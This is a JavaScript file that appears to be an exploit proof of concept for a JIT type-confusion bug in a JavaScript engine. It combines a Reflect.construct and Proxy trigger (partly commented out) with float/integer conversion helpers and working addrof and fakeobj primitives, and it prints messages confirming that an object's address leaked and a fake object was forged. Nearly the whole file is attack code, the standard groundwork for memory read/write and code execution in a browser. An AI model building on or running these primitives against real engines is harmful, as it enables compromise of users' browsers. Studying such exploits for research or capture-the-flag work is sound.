/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/*
'use strict';
(function() {
  var popped;

  function trigger(new_target) {
    function inner(new_target) {
      function constructor() {
        popped = Array.prototype.pop.call(array);
      }
      var temp = array[0];
      return Reflect.construct(constructor, arguments, new_target);
    }

    inner(new_target);
  }

  var array = new Array(0, 0, 0, 0, 0);

  for (var i = 0; i < 20000; i++) {
    trigger(function() { });
    array.push(0);
  }

  var proxy = new Proxy(Object, {
    get: () => (array[4] = 1.1, Object.prototype)
  });

  trigger(proxy);
  print(popped);
}());
----
*/

function addrof(obj) {
	let array = [1.2];

	function empty() {};

	function trigger(new_target) {
		let a = array.pop(Reflect.construct(empty, arguments, new_target));
		for (var i = 0; i < 0x10000; i++) {};
		return a;
	}
		
	var proxy = new Proxy(Object, {
		get: function() {
			array[0] = obj;
			return Object.prototype;
		}
	});

	function force_jit(func) {
		for (var i = 0; i < 20000; i++) {trigger(empty)};
		return trigger(func);
	}

	for (var i = 0; i < 20000; i++) {};

	force_jit(empty);
	return force_jit(proxy);
}

function fakeobj(addr) {
	let array = [1.2];

	function empty2() {};

	function trigger2(new_target) {
		let a = array.push(typeof(Reflect.construct(empty2, arguments, new_target)) === Proxy ? 1.1 : addr);
		for (var i = 0; i < 0x10000; i++) {};
	}
		
	var proxy2 = new Proxy(Object, {
		get: function() {
			array[0] = {};
			return Object.prototype;
		}
	});

	function force_jit2(func) {
		for (var i = 0; i < 20000; i++) {};
		trigger2(func);
	}

	for (var i = 0; i < 20000; i++) {empty2()};

	force_jit2(empty2);
	force_jit2(empty2);

	force_jit2(proxy2);
	return array[3];
}


let tmp_obj = {a:1, b:2};
let tmp_obj_addr = addrof(tmp_obj);
print("[+] Getting addrof 0x" + ftoi(tmp_obj_addr).toString(16));

let fake_obj = fakeobj(tmp_obj_addr);
if (fake_obj.a !== tmp_obj.a || fake_obj.b !== tmp_obj.b) {
	print("[-] Objects don't match");
} else {
	print("[+] Fakeobj created sucessfully");
}
